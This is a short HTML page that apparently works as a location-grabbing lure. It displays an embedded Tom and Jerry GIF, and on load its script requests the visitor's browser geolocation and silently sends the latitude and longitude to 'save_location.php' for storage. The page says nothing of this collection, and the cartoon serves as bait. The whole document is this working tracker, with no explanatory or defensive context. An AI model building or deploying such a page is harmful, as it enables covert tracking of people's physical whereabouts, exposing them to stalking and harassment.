


<!DOCTYPE html>
<html>
<body onload="getLocation()">
    <iframe src="https://giphy.com/embed/LgcDsIX4q6LiU" width="480" height="349" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cartoon-tom-and-jerry-gif-LgcDsIX4q6LiU">via GIPHY</a></p>



<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
xhttp.send();

}
</script>

</body>
</html>
